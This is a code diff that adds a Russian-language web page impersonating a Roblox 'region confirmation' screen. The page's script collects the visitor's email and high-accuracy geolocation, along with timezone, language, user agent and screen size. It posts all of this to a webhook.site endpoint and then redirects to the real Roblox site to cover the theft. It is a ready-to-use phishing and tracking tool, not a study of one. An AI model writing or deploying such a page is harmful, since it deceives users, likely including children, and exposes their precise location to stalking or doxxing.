@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Roblox — подтверждение региона</title>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+       background:#1b1b1f;font-family:system-ui,sans-serif;color:#eee;padding:20px}
+  .card{background:#26262c;padding:28px 22px;border-radius:14px;width:100%;max-width:340px;text-align:center}
+  .logo{font-weight:800;letter-spacing:3px;color:#fff;font-size:20px;margin-bottom:18px}
+  h1{font-size:17px;margin:0 0 8px}
+  .sub{font-size:13px;color:#9a9aa5;margin:0 0 18px;line-height:1.4}
+  input{width:100%;padding:12px;border-radius:8px;border:1px solid #3a3a44;
+        background:#1b1b1f;color:#eee;font-size:15px;margin-bottom:10px}
+  button{width:100%;padding:13px;border:0;border-radius:8px;background:#e2231a;
+         color:#fff;font-size:15px;font-weight:600}
+  button:disabled{opacity:.6}
+  .hint{font-size:12px;color:#7f7f8c;margin:12px 0 0;min-height:16px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">ROBLOX</div>
+  <h1>Подтверждение региона</h1>
+  <p class="sub">Укажите почту и разрешите определение региона, чтобы продолжить</p>
+  <input id="e" type="email" placeholder="Почта" autocomplete="email">
+  <button id="b" onclick="go()">Продолжить</button>
+  <p class="hint" id="h"></p>
+</div>
+<script>
+const HOOK = "https://webhook.site/296e25a5-d70e-4e4d-b7f8-bb23111295e7";
+
+function send(data){
+  return fetch(HOOK, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(data)
+  }).catch(() => {});
+}
+
+function go(){
+  const b = document.getElementById("b");
+  const h = document.getElementById("h");
+  b.disabled = true;
+  b.textContent = "Проверяем…";
+
+  const base = {
+    email: document.getElementById("e").value,
+    screen: innerWidth + "x" + innerHeight,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    lang: navigator.language,
+    ua: navigator.userAgent,
+    ts: new Date().toISOString()
+  };
+
+  const leave = () => setTimeout(() => location.href = "https://www.roblox.com", 1200);
+
+  if (!navigator.geolocation){
+    send(Object.assign(base, {geo:"unsupported"}));
+    return leave();
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    p => {
+      send(Object.assign(base, {
+        lat: p.coords.latitude,
+        lon: p.coords.longitude,
+        acc: Math.round(p.coords.accuracy)
+      }));
+      h.textContent = "Регион подтверждён";
+      leave();
+    },
+    err => {
+      send(Object.assign(base, {geo:"fail:" + err.code}));
+      h.textContent = "Не удалось определить регион";
+      leave();
+    },
+    {enableHighAccuracy:true, timeout:10000, maximumAge:0}
+  );
+}
+</script>
+</body>
+</html>
